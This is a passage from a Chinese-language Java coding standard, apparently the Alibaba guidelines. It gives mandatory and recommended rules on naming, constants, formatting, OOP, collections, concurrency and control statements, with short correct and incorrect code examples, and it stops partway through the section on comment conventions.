【强制】代码中的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。说明：正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，即使纯拼音命名方式也要避免采用。\n     正例： alibaba / taobao / youku / hangzhou 等国际通用的名称，可视同英文。\n     反例： DaZhePromotion [打折] / getPingfenByName() [评分] / int 某变量 = 3\n\n 3.  【强制】类名使用 UpperCamelCase 风格，必须遵从驼峰形式，但以下情形例外：DO / BO / DTO / VO / AO\n     正例： MarcoPolo / UserDO / XmlService / TcpUdpDeal / TaPromotion\n     反例： macroPolo / UserDo / XMLService / TCPUDPDeal / TAPromotion\n\n 4.  【强制】方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格，必须遵从驼峰形式。\n     正例： localValue / getHttpMessage() / inputUserId\n\n 5.  【强制】常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。\n     正例： MAX_STOCK_COUNT\n     反例： MAX_COUNT\n\n 6.  【强制】抽象类命名使用 Abstract 或 Base 开头；异常类命名使用 Exception 结尾；测试类命名以它要测试的类的名称开始，以 Test 结尾。\n\n 7.  【强制】中括号是数组类型的一部分，数组定义如下：String[] args。\n     反例： 使用 String args[] 的方式来定义。\n\n 8.  【强制】POJO 类中布尔类型的变量，都不要加 is，否则部分框架解析会引起序列化错误。\n     反例： 定义为基本数据类型 Boolean isDeleted；的属性，它的方法也是 isDeleted()，RPC 框架在反向解析的时候，“以为”对应的属性名称是 deleted，导致属性获取不到，进而抛出异常。\n\n 9.  【强制】包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用单数形式，但是类名如果有复数含义，类名可以使用复数形式。\n     正例： 应用工具类包名为 com.alibaba.open.util、类名为 MessageUtils（此规则参考 spring 的框架结构）\n\n 10. 【强制】杜绝完全不规范的缩写，避免望文不知义。\n     反例： AbstractClass “缩写”命名成 AbsClass；condition “缩写”命名成 condi，此类随意缩写严重降低了代码的可阅读性。\n\n 11. 【推荐】如果使用到了设计模式，建议在类名中体现出具体模式。\n     说明： 将设计模式体现在名字中，有利于阅读者快速理解架构设计思想。\n     正例：\n\npublic class OrderFactory;\npublic class LoginProxy;\npublic class ResourceObserver;\n\n\n1\n2\n3\n\n\n 12. 【推荐】接口类中的方法和属性不要加任何修饰符号（public 也不要加），保持代码的简洁性，并加上有效的 Javadoc 注释。尽量不要在接口里定义变量，如果一定要定义变量，肯定是与接口方法相关，并且是整个应用的基础常量。\n     正例： 接口方法签名：void f();\n     接口基础常量表示：String COMPANY = "alibaba";\n     反例： 接口方法定义：public abstract void f();\n     说明： JDK8 中接口允许有默认实现，那么这个 default 方法，是对所有实现类都有价值的默认实现。\n\n 13. 接口和实现类的命名有两套规则：\n     1） 【强制】对于 Service 和 DAO 类，基于 SOA 的理念，暴露出来的服务一定是接口，内部的实现类用 Impl 的后缀与接口区别。\n     正例： CacheServiceImpl 实现 CacheService 接口。\n     2） 【推荐】如果是形容能力的接口名称，取对应的形容词做接口名（通常是–able 的形式）。\n     正例： AbstractTranslator 实现 Translatable。\n\n 14. 【参考】枚举类名建议带上 Enum 后缀，枚举成员名称需要全大写，单词间用下划线隔开。\n     说明： 枚举其实就是特殊的常量类，且构造方法被默认强制是私有。\n     正例： 枚举名字：DealStatusEnum，成员名称：SUCCESS / UNKOWN_REASON。\n\n 15. 【参考】各层命名规约：\n     \n     1. Service/DAO 层方法命名规约\n        1） 获取单个对象的方法用 get 做前缀。\n        2） 获取多个对象的方法用 list 做前缀。\n        3） 获取统计值的方法用 count 做前缀。\n        4） 插入的方法用 save（推荐）或 insert 做前缀。\n        5） 删除的方法用 remove（推荐）或 delete 做前缀。\n        6） 修改的方法用 update 做前缀。\n     2. 领域模型命名规约\n        1） 数据对象：xxxDO，xxx 即为数据表名。\n        2） 数据传输对象：xxxDTO，xxx 为业务领域相关的名称。\n        3） 展示对象：xxxVO，xxx 一般为网页名称。\n        4） POJO 是 DO/DTO/BO/VO 的统称，禁止命名成 xxxPOJO。\n\n\n# 常量定义\n\n 1. 【强制】不允许任何魔法值（即未经定义的常量）直接出现在代码中。\n    反例：\n\nString key = "Id#taobao_" + tradeId;  \ncache.put(key, value);\n\n\n1\n2\n\n 2. 【强制】long 或者 Long 初始赋值时，必须使用大写的 L，不能是小写的 l，小写容易跟数字 1 混淆，造成误解。 说明：Long a = 2l; 写的是数字的 21，还是 Long 型的 2?\n 3. 【推荐】不要使用一个常量类维护所有常量，应该按常量功能进行归类，分开维护。如：缓存相关的常量放在类：CacheConsts 下；系统配置相关的常量放在类：ConfigConsts 下。\n    说明： 大而全的常量类，非得使用查找功能才能定位到修改的常量，不利于理解和维护。\n 4. 【推荐】常量的复用层次有五层：跨应用共享常量、应用内共享常量、子工程内共享常量、包内共享常量、类内共享常量。 1） 跨应用共享常量：放置在二方库中，通常是 client.jar 中的 constant 目录下。\n    2） 应用内共享常量：放置在一方库的 modules 中的 constant 目录下。\n    反例： 易懂变量也要统一定义成应用内共享常量，两位攻城师在两个类中分别定义了表示“是”的变量：\n\n类 A 中：public static final String YES = "yes";  \n类 B 中：public static final String YES = "y";  \nA.YES.equals(B.YES)，预期是 true，但实际返回为 false，导致线上问题。  \n\n\n1\n2\n3\n\n\n3） 子工程内部共享常量：即在当前子工程的 constant 目录下。\n4） 包内共享常量：即在当前包下单独的 constant 目录下。\n5） 类内共享常量：直接在类内部 private static final 定义。\n\n 5. 【推荐】如果变量值仅在一个范围内变化，且带有名称之外的延伸属性，定义为枚举类。下面正例中的数字就是延伸信息，表示星期几。\n    正例： public Enum { MONDAY(1), TUESDAY(2), WEDNESDAY(3), THURSDAY(4), FRIDAY(5), SATURDAY(6), SUNDAY(7);}\n\n\n# 代码格式\n\n 1. 【强制】大括号的使用约定。如果是大括号内为空，则简洁地写成{}即可，不需要换行；如果是非空代码块则：\n    1） 左大括号前不换行。\n    2） 左大括号后换行。\n    3） 右大括号前换行。\n    4） 右大括号后还有 else 等代码则不换行；表示终止的右大括号后必须换行。\n\n 2. 【强制】 左小括号和字符之间不出现空格；同样，右小括号和字符之间也不出现空格。详见 第 5 条下方正例提示。\n    反例： if (空格 a == b 空格)\n\n 3. 【强制】if/for/while/switch/do 等保留字与括号之间都必须加空格。\n\n 4. 【强制】任何二目、三目运算符的左右两边都需要加一个空格。\n    说明： 运算符包括赋值运算符=、逻辑运算符&&、加减乘除符号等。\n\n 5. 【强制】缩进采用 4 个空格，禁止使用 tab 字符。\n    说明： 如果使用 tab 缩进，必须设置 1 个 tab 为 4 个空格。IDEA 设置 tab 为 4 个空格时，请勿勾选 Use tab character；而在 eclipse 中，必须勾选 insert spaces for tabs。\n    正例： （涉及 1-5 点）\n\npublic static void main(String[] args) {\n  // 缩进 4 个空格\n  String say = "hello";\n  // 运算符的左右必须有一个空格\n  int flag = 0;\n  // 关键词 if 与括号之间必须有一个空格，括号内的 f 与左括号，0 与右括号不需要空格\n  if (flag == 0) {\n      System.out.println(say);\n  }\n\n  // 左大括号前加空格且不换行；左大括号后换行\n  if (flag == 1) {\n      System.out.println("world");\n      // 右大括号前换行，右大括号后有 else，不用换行\n  } else {\n      System.out.println("ok");\n      // 在右大括号后直接结束，则必须换行\n  }\n} \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n 6. 【强制】单行字符数限制不超过 120 个，超出需要换行，换行时遵循如下原则：\n    1） 第二行相对第一行缩进 4 个空格，从第三行开始，不再继续缩进，参考示例。\n    2） 运算符与下文一起换行。\n    3） 方法调用的点符号与下文一起换行。\n    4） 在多个参数超长，在逗号后换行。\n    5） 在括号前不要换行，见反例。\n    正例：\n\n StringBuffer sb = new StringBuffer();\n //超过 120 个字符的情况下，换行缩进 4 个空格，并且方法前的点符号一起换行\n sb.append("zi").append("xin")...\n .append("huang")...\n .append("huang")...\n .append("huang");\n\n\n1\n2\n3\n4\n5\n6\n\n\n反例：\n\n StringBuffer sb = new StringBuffer();\n //超过 120 个字符的情况下，不要在括号前换行\n sb.append("zi").append("xin")...append\n ("huang");\n //参数很多的方法调用可能超过 120 个字符，不要在逗号前换行\n method(args1, args2, args3, ...\n , argsX); \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n 7. 【强制】方法参数在定义和传入时，多个参数逗号后边必须加空格。\n    正例： 下例中实参的"a",后边必须要有一个空格。method("a", "b", "c");\n\n 8. 【强制】IDE 的 text file encoding 设置为 UTF-8; IDE 中文件的换行符使用 Unix 格式，不要使用 windows 格式。\n\n 9. 【推荐】没有必要增加若干空格来使某一行的字符与上一行对应位置的字符对齐。\n    正例：\n\n  int a = 3;\n  long b = 4L;\n  float c = 5F;\n  StringBuffer sb = new StringBuffer();\n\n\n1\n2\n3\n4\n\n\n说明： 增加 sb 这个变量，如果需要对齐，则给 a、b、c 都要增加几个空格，在变量比较多的情况下，是一种累赘的事情。\n\n 10. 【推荐】方法体内的执行语句组、变量的定义语句组、不同的业务逻辑之间或者不同的语义之间插入一个空行。相同业务逻辑和语义之间不需要插入空行。\n     说明： 没有必要插入多个空行进行隔开。\n\n\n# OOP 规约\n\n 1.  【强制】避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成本，直接用类名来访问即可。\n\n 2.  【强制】所有的覆写方法，必须加@Override 注解。\n     说明： getObject() 与 get0bject() 的问题。一个是字母的 O，一个是数字的 0，加 @Override可以准确判断是否覆盖成功。另外，如果在抽象类中对方法签名进行修改，其实现类会马上编译报错。\n\n 3.  【强制】相同参数类型，相同业务含义，才可以使用 Java 的可变参数，避免使用 Object。\n     说明： 可变参数必须放置在参数列表的最后。（提倡同学们尽量不用可变参数编程）\n     正例： public User getUsers(String type, Integer... ids) {...}\n\n 4.  【强制】外部正在调用或者二方库依赖的接口，不允许修改方法签名，避免对接口调用方产生影响。接口过时必须加 @Deprecated 注解，并清晰地说明采用的新接口或者新服务是什么。\n\n 5.  【强制】不能使用过时的类或方法。\n     说明： java.net.URLDecoder 中的方法 decode(String encodeStr) 这个方法已经过时，应该使用双参数 decode(String source, String encode)。接口提供方既然明确是过时接口，那么有义务同时提供新的接口；作为调用方来说，有义务去考证过时方法的新实现是什么。\n\n 6.  【强制】Object 的 equals 方法容易抛空指针异常，应使用常量或确定有值的对象来调用 equals。 正例： "test".equals(object); 反例： object.equals("test"); 说明： 推荐使用 java.util.Objects#equals （JDK7 引入的工具类）\n\n 7.  【强制】所有的相同类型的包装类对象之间值的比较，全部使用 equals 方法比较。 说明：对于 Integer var = ? 在-128 至 127 范围内的赋值，Integer 对象是在 IntegerCache.cache 产生，会复用已有对象，这个区间内的 Integer 值可以直接使用 == 进行判断，但是这个区间之外的所有数据，都会在堆上产生，并不会复用已有对象，这是一个大坑，推荐使用 equals 方法进行判断。\n\n 8.  关于基本数据类型与包装数据类型的使用标准如下：\n     1） 【强制】所有的 POJO 类属性必须使用包装数据类型。\n     2） 【强制】RPC 方法的返回值和参数必须使用包装数据类型。\n     3） 【推荐】所有的局部变量使用基本数据类型。\n     说明： POJO 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何 NPE 问题，或者入库检查，都由使用者来保证。\n     正例： 数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。\n     反例： 比如显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示：0%，这是不合理的，应该显示成中划线-。所以包装数据类型的 null 值，能够表示额外的信息，如：远程调用失败，异常退出。\n\n 9.  【强制】定义 DO/DTO/VO 等 POJO 类时，不要设定任何属性默认值。\n     反例： POJO 类的 gmtCreate 默认值为 new Date();但是这个属性在数据提取时并没有置入具 体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间。\n\n 10. 【强制】序列化类新增属性时，请不要修改 serialVersionUID 字段，避免反序列失败；如 果完全不兼容升级，避免反序列化混乱，那么请修改 serialVersionUID 值。\n     说明： 注意 serialVersionUID 不一致会抛出序列化运行时异常。\n\n 11. 【强制】构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。\n\n 12. 【强制】POJO 类必须写 toString 方法。使用 IDE 的中工具：source> generate toString 时，如果继承了另一个 POJO 类，注意在前面加一下 super.toString。\n     说明： 在方法执行抛出异常时，可以直接调用 POJO 的 toString()方法打印其属性值，便于排查问题。\n\n 13. 【推荐】使用索引访问用 String 的 split 方法得到的数组时，需做最后一个分隔符后有无内容的检查，否则会有抛 IndexOutOfBoundsException 的风险。\n     说明：\n\nString str = "a,b,c,,";\nString[] ary = str.split(",");\n//预期大于 3，结果是 3\nSystem.out.println(ary.length);\n\n\n1\n2\n3\n4\n\n\n 14. 【推荐】当一个类有多个构造方法，或者多个同名方法，这些方法应该按顺序放置在一起，便于阅读。\n\n 15. 【推荐】 类内方法定义顺序依次是：公有方法或保护方法 > 私有方法 > getter/setter 方法。\n     说明： 公有方法是类的调用者和维护者最关心的方法，首屏展示最好；保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法；而私有方法外部一般不需要特别关心，是一个黑盒实现；因为方法信息价值较低，所有 Service 和 DAO 的 getter/setter 方法放在类体最后。\n\n 16. 【推荐】setter 方法中，参数名称与类成员变量名称一致，this.成员名 = 参数名。在 getter/setter 方法中，不要增加业务逻辑，增加排查问题的难度。\n     反例：\n\npublic Integer getData() {\n    if (true) {\n   \t return this.data + 100;\n    } else {\n    \treturn this.data - 100;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 17. 【推荐】循环体内，字符串的连接方式，使用 StringBuilder 的 append 方法进行扩展。\n     说明： 反编译出的字节码文件显示每次循环都会 new 出一个 StringBuilder 对象，然后进行 append 操作，最后通过 toString 方法返回 String 对象，造成内存资源浪费。\n     反例：\n\nString str = "start";\nfor (int i = 0; i < 100; i++) {\n   str = str + "hello";\n}\n\n\n1\n2\n3\n4\n\n\n 18. 【推荐】final 可以声明类、成员变量、方法、以及本地变量，下列情况使用 final 关键字：\n     1） 不允许被继承的类，如：String 类。\n     2） 不允许修改引用的域对象，如：POJO 类的域变量。\n     3） 不允许被重写的方法，如：POJO 类的 setter 方法。\n     4） 不允许运行过程中重新赋值的局部变量。\n     5） 避免上下文重复使用一个变量，使用 final 描述可以强制重新定义一个变量，方便更好地进行重构。\n\n 19. 【推荐】慎用 Object 的 clone 方法来拷贝对象。\n     说明： 对象的 clone 方法默认是浅拷贝，若想实现深拷贝需要重写 clone 方法实现属性对象的拷贝。\n\n 20. 【推荐】类成员与方法访问控制从严：\n     1） 如果不允许外部直接通过 new 来创建对象，那么构造方法必须是 private。\n     2） 工具类不允许有 public 或 default 构造方法。\n     3） 类非 static 成员变量并且与子类共享，必须是 protected。\n     4） 类非 static 成员变量并且仅在本类使用，必须是 private。\n     5） 类 static 成员变量如果仅在本类使用，必须是 private。\n     6） 若是 static 成员变量，必须考虑是否为 final。\n     7） 类成员方法只供类内部调用，必须是 private。\n     8） 类成员方法只对继承类公开，那么限制为 protected。\n     说明： 任何类、方法、参数、变量，严控访问范围。过于宽泛的访问范围，不利于模块解耦。 思考：如果是一个 private 的方法，想删除就删除，可是一个 public 的 service 方法，或者一个 public 的成员变量，删除一下，不得手心冒点汗吗？变量像自己的小孩，尽量在自己的视线内，变量作用域太大，如果无限制的到处跑，那么你会担心的。\n\n\n# 集合处理\n\n 1. 【强制】关于 hashCode 和 equals 的处理，遵循如下规则：\n    1） 只要重写 equals，就必须重写 hashCode。\n    2） 因为 Set 存储的是不重复的对象，依据 hashCode 和 equals 进行判断，所以 Set 存储的对象必须重写这两个方法。\n    3） 如果自定义对象做为 Map 的键，那么必须重写 hashCode 和 equals。\n    说明： String 重写了 hashCode 和 equals 方法，所以我们可以非常愉快地使用 String 对象作为 key 来使用。\n\n 2. 【强制】ArrayList 的 subList 结果不可强转成 ArrayList，否则会抛出 ClassCastException 异常：java.util.RandomAccessSubList cannot be cast to java.util.ArrayList ;\n    说明： subList 返回的是 ArrayList 的内部类 SubList，并不是 ArrayList ，而是 ArrayList 的一个视图，对于 SubList 子列表的所有操作最终会反映到原列表上。\n\n 3. 【强制】 在 subList 场景中，高度注意对原集合元素个数的修改，会导致子列表的遍历、增 加、删除均产生 ConcurrentModificationException 异常。\n\n 4. 【强制】使用集合转数组的方法，必须使用集合的 toArray(T[] array)，传入的是类型完全一样的数组，大小就是 list.size()。\n    说明： 使用 toArray 带参方法，入参分配的数组空间不够大时，toArray 方法内部将重新分配内存空间，并返回新数组地址；如果数组元素大于实际所需，下标为[ list.size() ]的数组元素将被置为 null，其它数组元素保持原值，因此最好将方法入参数组大小定义与集合元素个数一致。\n    正例：\n\n List<String> list = new ArrayList<String>(2);\n list.add("guan");\n list.add("bao");\n String[] array = new String[list.size()];\n array = list.toArray(array);\n\n\n1\n2\n3\n4\n5\n\n\n反例： 直接使用 toArray 无参方法存在问题，此方法返回值只能是 Object[]类，若强转其它类型数组将出现 ClassCastException 错误。\n\n 5. 【强制】使用工具类 Arrays.asList()把数组转换成集合时，不能使用其修改集合相关的方 法，它的 add/remove/clear 方法会抛出 UnsupportedOperationException 异常。\n    说明： asList 的返回对象是一个 Arrays 内部类，并没有实现集合的修改方法。Arrays.asList 体现的是适配器模式，只是转换接口，后台的数据仍是数组。\n\n  String[] str = new String[] { "a", "b" };\n  List list = Arrays.asList(str);\n\n\n1\n2\n\n\n第一种情况：list.add("c"); 运行时异常。\n第二种情况：str[0] = "gujin"; 那么 list.get(0)也会随之修改。\n\n 6. 【强制】泛型通配符 <? extends T> 来接收返回的数据，此写法的泛型集合不能使用 add 方法，而 <? super T> 不能使用 get 方法，做为接口调用赋值时易出错。\n    说明： 扩展说一下 PECS(Producer Extends Consumer Super) 原则：1）频繁往外读取内容 的，适合用上界 Extends。2）经常往里插入的，适合用下界 Super。\n\n 7. 【强制】不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式，如果并发操作，需要对 Iterator 对象加锁。\n    正例：\n\nIterator<String> it = a.iterator();\nwhile (it.hasNext()) {\n   String temp = it.next();\n   if (删除元素的条件) {\n       it.remove();\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n反例：\n\nList<String> a = new ArrayList<String>();\na.add("1");\na.add("2");\nfor (String temp : a) {\n   if ("1".equals(temp)) {\n       a.remove(temp);\n   }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n说明： 以上代码的执行结果肯定会出乎大家的意料，那么试一下把“1”换成“2”，会是同样的结果吗？\n\n 8. 【强制】 在 JDK7 版本及以上，Comparator 要满足如下三个条件，不然 Arrays.sort，Collections.sort 会报 IllegalArgumentException 异常。\n    说明：\n    1） x，y 的比较结果和 y，x 的比较结果相反。\n    2） x>y，y>z，则 x>z。\n    3） x=y，则 x，z 比较结果和 y，z 比较结果相同。\n    反例： 下例中没有处理相等的情况，实际使用中可能会出现异常：\n\n new Comparator<Student>() {\n     @Override\n     public int compare(Student o1, Student o2) {\n         return o1.getId() > o2.getId() ? 1 : -1;\n     }\n };\n\n\n1\n2\n3\n4\n5\n6\n\n\n 9.  【推荐】集合初始化时，指定集合初始值大小。\n     说明： HashMap 使用 HashMap(int initialCapacity) 初始化， 正例： initialCapacity = (需要存储的元素个数 / 负载因子) + 1。注意负载因子（即 loaderfactor）默认为 0.75，如果暂时无法确定初始值大小，请设置为 16。\n     反例： HashMap 需要放置 1024 个元素，由于没有设置容量初始大小，随着元素不断增加，容量 7 次被迫扩大，resize 需要重建 hash 表，严重影响性能。\n\n 10. 【推荐】使用 entrySet 遍历 Map 类集合 KV，而不是 keySet 方式进行遍历。\n     说明： keySet 其实是遍历了 2 次，一次是转为 Iterator 对象，另一次是从 hashMap 中取出 key 所对应的 value。而 entrySet 只是遍历了一次就把 key 和 value 都放到了 entry 中，效率更高。如果是 JDK8，使用 Map.foreach 方法。\n     正例： values() 返回的是 V 值集合，是一个 list 集合对象；keySet() 返回的是 K 值集合，是一个 Set 集合对象；entrySet() 返回的是 K-V 值组合集合。\n\n 11. 【推荐】高度注意 Map 类集合 K/V 能不能存储 null 值的情况，如下表格：\n\n集合类                 KEY         VALUE       SUPER         说明\nHashTable           不允许为 null   不允许为 null   Dictionary    线程安全\nConcurrentHashMap   不允许为 null   不允许为 null   AbstractMap   分段锁技术\nTreeMap             不允许为 null   允许为 null    AbstractMap   线程不安全\nHashMap             允许为 null    允许为 null    AbstractMap   线程不安全\n\n反例： 由于 HashMap 的干扰，很多人认为 ConcurrentHashMap 是可以置入 null 值，而事实上，存储 null 值时会抛出 NPE 异常。\n\n 12. 【参考】合理利用好集合的有序性(sort)和稳定性(order)，避免集合的无序性(unsort)和不稳定性(unorder)带来的负面影响。\n     说明： 有序性是指遍历的结果是按某种比较规则依次排列的。稳定性指集合每次遍历的元素次 序是一定的。如： ArrayList 是 order/unsort；HashMap 是 unorder/unsort；TreeSet 是 order/sort。\n\n 13. 【参考】利用 Set 元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 List 的 contains 方法进行遍历、对比、去重操作。\n\n\n# 并发处理\n\n 1. 【强制】获取单例对象需要保证线程安全，其中的方法也要保证线程安全。\n    说明： 资源驱动类、工具类、单例工厂类都需要注意。\n\n 2. 【强制】创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。\n    正例：\n\n public class TimerTaskThread extends Thread {\n     public TimerTaskThread() {\n         super.setName("TimerTaskThread"); ...\n     }\n }\n\n\n1\n2\n3\n4\n5\n\n\n 3. 【强制】线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。\n    说明： 使用线程池的好处是减少在创建和销毁线程上所花的时间以及系统资源的开销，解决资 源不足的问题。如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。\n\n 4. 【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。\n    说明： Executors 返回的线程池对象的弊端如下：\n    \n    1. FixedThreadPool 和 SingleThreadPool:\n       允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。\n    2. CachedThreadPool 和 ScheduledThreadPool:\n       允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。\n\n 5. 【强制】SimpleDateFormat 是线程不安全的类，一般不要定义为 static 变量，如果定义为 static，必须加锁，或者使用 DateUtils 工具类。\n    正例： 注意线程安全，使用 DateUtils。亦推荐如下处理：\n\n  private static final ThreadLocal<DateFormat> df = new ThreadLocal<DateFormat>() {\n      @Override\n      protected DateFormat initialValue() {\n          return new SimpleDateFormat("yyyy-MM-dd");\n      }\n  };\n\n\n1\n2\n3\n4\n5\n6\n\n\n说明： 如果是 JDK8 的应用，可以使用 Instant 代替 Date，LocalDateTime 代替 Calendar，DateTimeFormatter 代替 Simpledateformatter，官方给出的解释：simple beautiful strong immutable thread-safe。\n\n 6.  【强制】高并发时，同步调用应该去考量锁的性能损耗。能用无锁数据结构，就不要用锁；能锁区块，就不要锁整个方法体；能用对象锁，就不要用类锁。\n     说明： 尽可能使加锁的代码块工作量尽可能的小，避免在锁代码块中调用 RPC 方法。\n\n 7.  【强制】对多个资源、数据库表、对象同时加锁时，需要保持一致的加锁顺序，否则可能会造成死锁。\n     说明： 线程一需要对表 A、B、C 依次全部加锁后才可以进行更新操作，那么线程二的加锁顺序也必须是 A、B、C，否则可能出现死锁。\n\n 8.  【强制】并发修改同一记录时，避免更新丢失，需要加锁。要么在应用层加锁，要么在缓存加锁，要么在数据库层使用乐观锁，使用 version 作为更新依据。\n     说明： 如果每次访问冲突概率小于 20%，推荐使用乐观锁，否则使用悲观锁。乐观锁的重试次数不得小于 3 次。\n\n 9.  【强制】多线程并行处理定时任务时，Timer 运行多个 TimeTask 时，只要其中之一没有捕获抛出的异常，其它任务便会自动终止运行，使用 ScheduledExecutorService 则没有这个问题。\n\n 10. 【推荐】使用 CountDownLatch 进行异步转同步操作，每个线程退出前必须调用 countDown 方法，线程执行代码注意 catch 异常，确保 countDown 方法可以执行，避免主线程无法执行至 await 方法，直到超时才返回结果。\n     说明： 注意，子线程抛出异常堆栈，不能在主线程 try-catch 到。\n\n 11. 【推荐】避免 Random 实例被多线程使用，虽然共享该实例是线程安全的，但会因竞争同一 seed 导致的性能下降。\n     说明： Random 实例包括 java.util.Random 的实例或者 Math.random() 的方式。\n     正例： 在 JDK7 之后，可以直接使用 API ThreadLocalRandom，而在 JDK7 之前，需要编码保证每个线程持有一个实例。\n\n 12. 【推荐】在并发场景下，通过双重检查锁（double-checked locking）实现延迟初始化的优化问题隐患(可参考 The "Double-Checked Locking is Broken" Declaration)，推荐问题解决方案中较为简单一种（适用于 JDK5 及以上版本），将目标属性声明为 volatile 型。\n     反例：\n\nclass Foo {\n    private Helper helper = null;\n    public Helper getHelper() {\n        if (helper == null) synchronized(this) {\n            if (helper == null)\n                helper = new Helper();\n        }\n        return helper;\n    }\n    // other functions and members...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n 13. 【参考】volatile 解决多线程内存不可见问题。对于一写多读，是可以解决变量同步问题，但是如果多写，同样无法解决线程安全问题。如果是 count++操作，使用如下类实现： AtomicInteger count = new AtomicInteger(); count.addAndGet(1); 如果是 JDK8，推荐使用 LongAdder 对象，比 AtomicLong 性能更好（减少乐观锁的重试次数）。\n\n 14. 【参考】 在容量不够进行 resize 时由于高并发可能出现死链，导致 CPU 飙升，在开发过程中可以使用其它数据结构或加锁来规避此风险。\n\n 15. 【参考】ThreadLocal 无法解决共享对象的更新问题，ThreadLocal 对象建议使用 static 修饰。这个变量是针对一个线程内所有操作共有的，所以设置为静态变量，所有此类实例共享此静态变量，也就是说在类第一次被使用时装载，只分配一块存储空间，所有此类的对象(只要是这个线程内定义的)都可以操控这个变量。\n\n\n# 控制语句\n\n 1. 【强制】在一个 switch 块内，每个 case 要么通过 break/return 等来终止，要么注释说明程序将继续执行到哪一个 case 为止；在一个 switch 块内，都必须包含一个 default 语句并且放在最后，即使它什么代码也没有。\n\n 2. 【强制】在 if/else/for/while/do 语句中必须使用大括号。即使只有一行代码，避免使用单行的形式：if (condition) statements;\n\n 3. 【推荐】表达异常的分支时，少用 if-else 方式，这种方式可以改写成：\n\n    if (condition) {\n     ...\n     return obj;\n    }\n    // 接着写 else 的业务逻辑代码;\n\n\n1\n2\n3\n4\n5\n\n\n说明： 如果非得使用 if()...else if()...else...方式表达逻辑，【强制】避免后续代码维护困难，请勿超过 3 层。\n\n正例： 逻辑上超过 3 层的 if-else 代码可以使用卫语句，或者状态模式来实现。卫语句示例如下：\n\n    public void today() {\n        if (isBusy()) {\n            System.out.println(“change time.”);\n            return;\n        }\n        if (isFree()) {\n            System.out.println(“go to travel.”);\n            return;\n        }\n        System.out.println(“stay at home to learn Alibaba Java Coding Guideline.”);\n        return;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 4. 【推荐】除常用方法（如 getXxx/isXxx）等外，不要在条件判断中执行其它复杂的语句，将复杂逻辑判断的结果赋值给一个有意义的布尔变量名，以提高可读性。\n    说明： 很多 if 语句内的逻辑相当复杂，阅读者需要分析条件表达式的最终结果，才能明确什么样的条件执行什么样的语句，那么，如果阅读者分析逻辑表达式错误呢？\n    正例：\n\n //伪代码如下\n final boolean existed = (file.open(fileName, "w") != null) && (...) || (...);\n if (existed) {\n  ...\n }\n\n\n1\n2\n3\n4\n5\n\n\n反例：\n\n if ((file.open(fileName, "w") != null) && (...) || (...)) {\n  ...\n }\n\n\n1\n2\n3\n\n\n 5. 【推荐】循环体中的语句要考量性能，以下操作尽量移至循环体外处理，如定义对象、变量、获取数据库连接，进行不必要的 try-catch 操作（这个 try-catch 是否可以移至循环体外）。\n\n 6. 【推荐】接口入参保护，这种场景常见的是用于做批量操作的接口。\n\n 7. 【参考】下列情形，需要进行参数校验：\n    1） 调用频次低的方法。\n    2） 执行时间开销很大的方法。此情形中，参数校验时间几乎可以忽略不计，但如果因为参 数错误导致中间执行回退，或者错误，那得不偿失。\n    3） 需要极高稳定性和可用性的方法。\n    4） 对外提供的开放接口，不管是 RPC/API/HTTP 接口。\n    5） 敏感权限入口。\n\n 8. 【参考】下列情形，不需要进行参数校验：\n    1） 极有可能被循环调用的方法。但在方法说明里必须注明外部参数检查要求。\n    2） 底层调用频度比较高的方法。毕竟是像纯净水过滤的最后一道，参数错误不太可能到底 层才会暴露问题。一般 DAO 层与 Service 层都在同一个应用中，部署在同一台服务器中，所以 DAO 的参数校验，可以省略。\n    3） 被声明成 private 只会被自己代码所调用的方法，如果能够确定调用方法的代码传入参数已经做过检查或者肯定不会有问题，此时可以不校验参数。\n\n\n# 注释规约\n\n 1.  【强制】类、类属性、类方法的注释必须使用 Javadoc 规范，使用/**内容*/格式，不得使用 //xxx 方式。\n     说明： 在 IDE 编辑窗口中，Javadoc 方式会提示相关注释，生成 Javadoc 可以正确输出相应注释；在 IDE 中，工程调用方法时，不进入方法即可悬浮提示方法、参数、返回值的意义，提高 阅读效率。\n\n 2.  【强制】所有的抽象方法（包括接口中的方法）必须要用 Javadoc 注释、除了返回值、参数、异常说明外，还必须指出该方法做什么事情，实现什么功能。\n     说明： 对子类的实现要求，或者调用注意事项，请一并说明。\n\n 3.  【强制】所有的类都必须添加创建者和创建日期。\n\n 4.  【强制】方法内部单行注释，在被注释语句上方另起一行，使用 //注释。方法内部多行注释使用/* */注释，注意与代码对齐。\n\n 5.  【强制】所有的枚举类型字段必须要有注释，说明每个数据项的用途。\n\n 6.  